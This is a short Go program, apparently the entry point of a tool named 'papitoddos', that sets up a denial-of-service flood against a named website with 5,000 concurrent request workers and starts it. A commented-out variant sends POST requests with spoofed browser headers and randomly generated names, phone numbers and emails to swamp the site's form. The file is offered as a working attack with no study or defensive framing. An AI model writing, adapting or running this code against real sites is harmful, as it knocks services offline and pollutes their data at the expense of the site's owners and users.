package main

import (
	"papitoddos/ddos"
)

func main() {

	config := &ddos.RequestConfig{
		URL:         "https://gamescoregenius.win/",
		Method:      "GET",
		WorkerCount: 5_000,
	}
	d := ddos.New(config)

	// config := &ddos.RequestConfig{
	// 	URL:         "https://gamescoregenius.win/",
	// 	Method:      "POST",
	// 	WorkerCount: 5000,
	// 	Headers: map[string]string{
	// 		"Accept":             "*/*",
	// 		"Accept-Language":    "en",
	// 		"Content-Type":       "application/x-www-form-urlencoded; charset=UTF-8",
	// 		"Cookie":             "spu_box_2591=true",
	// 		"Origin":             "https://gamescoregenius.win/",
	// 		"Priority":           "u=1, i",
	// 		"Referer":            "https://gamescoregenius.win/",
	// 		"Sec-Ch-Ua":          `"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"`,
	// 		"Sec-Ch-Ua-Mobile":   "?0",
	// 		"Sec-Ch-Ua-Platform": `"macOS"`,
	// 		"Sec-Fetch-Dest":     "empty",
	// 		"Sec-Fetch-Mode":     "cors",
	// 		"Sec-Fetch-Site":     "same-origin",
	// 		"User-Agent":         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	// 		"X-Requested-With":   "XMLHttpRequest",
	// 	},
	// }

	// Create form data with random values
	// data := url.Values{}
	// data.Set("name", generateRandomName())
	// data.Set("phone", generateRandomPhone())
	// data.Set("email", generateRandomEmail())

	// config.Body = strings.NewReader(data.Encode())

	d.Start()
}
